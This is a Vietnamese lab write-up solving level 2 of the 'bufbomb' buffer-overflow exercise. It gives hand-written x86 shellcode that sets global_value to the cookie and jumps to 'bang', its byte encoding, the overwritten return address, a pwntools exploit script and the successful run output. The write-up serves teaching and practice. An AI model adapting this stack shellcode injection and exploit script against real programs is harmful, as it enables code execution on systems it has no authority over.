# Level 2
## Task
Buffer overflow hàm `getbuf` để thực thi được hàm `bang` với `global_value == cookie`.  
```c
void __noreturn bang()
{
  if ( global_value == cookie )
  {
    printf("Bang!: You set global_value to 0x%x\n", global_value);
    validate(2);
  }
  else
  {
    printf("Misfire: global_value = 0x%x\n", global_value);
  }
  exit(0);
}
```

## Solution
Tương tự như các level trước, chúng ta vẫn sẽ overflow buffer có độ dài `40` bytes. Nhưng ở level này, chúng ta cần inject shellcode để có thể set giá trị của `global_value` bằng với giá trị `cookie`.  

Trước tiên, để gán được giá trị mới cho `global_value`, chúng ta cần biết được địa chỉ của `global_value`. Trong IDA Pro, chúng ta có thể xem được địa chỉ của biến `global_value`.  
```
.bss:8013F160 global_value    dd ?
```  

Và cả địa chỉ của biến `cookie`.  
```
.bss:8013F158 cookie          dd ?
```  

Vậy shellcode của chúng ta như sau:  
```asm
movl $0x8013F158,%eax
movl (%eax),%eax
movl $0x8013F160,%ebx
movl %eax,(%ebx)
push $0x80139b69
ret
```  

> `0x8013F160` là địa chỉ của biến `global_value`.
> `0x8013F158` là địa chỉ của biến `cookie`.
> `0x80139B69` là địa chỉ của hàm `bang`.  

Byte biểu diễn của shellcode:  
```
└─$ objdump -d shellcode.o

shellcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   b8 58 f1 13 80          mov    $0x8013f158,%eax
   5:   8b 00                   mov    (%eax),%eax
   7:   bb 60 f1 13 80          mov    $0x8013f160,%ebx
   c:   89 03                   mov    %eax,(%ebx)
   e:   68 69 9b 13 80          push   $0x80139b69
  13:   c3                      ret
```

Tiếp theo, chúng ta sẽ tìm địa chỉ để ghi đè vào `return address`.  
Ở đây, vì shellcode sẽ được chèn vào đầu chuỗi nhập nên giá trị mà chúng ta sẽ ghi đè lên `return address` chính là địa chỉ của chuỗi nhập. Trong quá trình debug thì chúng ta tìm được địa chỉ là:  
```
pwndbg> p/x $eax
$1 = 0x55683cf8
```  

Vậy `exploit_payload` của chúng ta sẽ có độ dài là `0x28 + 0x4 + 0x4` với `0x28` bytes sẽ chứa shellcode và các giá trị padding, `0x4` bytes tiếp theo để ghi đè `saved %ebp`, và `0x4` bytes cuối cùng để ghi đè `return address`.  

### Script
```python
#! /bin/python3

from pwn import *

context.binary = './bufbomb'

io = process(['./bufbomb', '-u', '09821978'])

shellcode = b'\xb8\x58\xf1\x13\x80\x8b\x00\xbb\x60\xf1\x13\x80\x89\x03\x68\x69\x9b\x13\x80\xc3'
exploit_payload = shellcode + b'\x90' * (0x28 + 0x4 - len(shellcode))
exploit_payload += p32(0x55683cf8)

print(f"{exploit_payload = }")

io.sendline(exploit_payload)
io.interactive()
```  

Chạy script.  
```
└─$ python3 level2.py
[*] '/mnt/f/src-team-1/bufbomb'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './bufbomb': pid 391
exploit_payload = b'\xb8X\xf1\x13\x80\x8b\x00\xbb`\xf1\x13\x80\x89\x03hi\x9b\x13\x80\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf8<hU'
[*] Switching to interactive mode
[*] Process './bufbomb' stopped with exit code 0 (pid 391)
Userid: 09821978
Cookie: 0x31f21393
Type string:Bang!: You set global_value to 0x31f21393
VALID
NICE JOB!
```  
> Thành công!
